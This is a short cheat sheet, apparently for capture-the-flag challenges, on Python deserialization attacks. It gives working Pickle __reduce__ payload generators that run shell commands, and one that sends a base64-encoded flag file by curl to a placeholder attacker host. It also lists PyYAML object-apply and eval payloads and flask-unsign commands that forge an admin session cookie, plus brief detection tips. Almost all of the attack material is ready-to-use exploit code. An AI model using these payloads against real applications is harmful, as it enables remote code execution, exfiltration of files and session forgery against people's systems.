# Python Deserialization (Pickle / YAML)

## Pickle RCE
```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /flag',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

### Pickle with reverse shell
```python
import pickle, base64

class Exploit:
    def __reduce__(self):
        import os
        return (os.popen, ('curl ATTACKER_IP:PORT/$(cat /flag | base64)',))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

## YAML Deserialization (PyYAML)
```yaml
# PyYAML < 5.1
!!python/object/apply:os.system ['cat /flag']
!!python/object/apply:subprocess.check_output [['cat', '/flag']]

# Construct tuple trick
!!python/object/new:tuple
- !!python/object/new:map
  - !!python/name:eval
  - ["__import__('os').system('cat /flag')"]
```

## Detection
- Look for `pickle.loads()`, `pickle.load()` in source
- Check for base64-encoded cookies that decode to pickle data (starts with `\x80\x04\x95`)
- Look for `yaml.load()` without `Loader=SafeLoader`
- Check JWT tokens with pickle-serialized payloads

## Flask Session Deserialization
Flask uses itsdangerous signed cookies. If you have SECRET_KEY:
```bash
# Install flask-unsign
pip install flask-unsign

# Decode session
flask-unsign --decode --cookie "eyJ..."

# Forge session
flask-unsign --sign --cookie "{'admin': True}" --secret "SECRET_KEY"
```
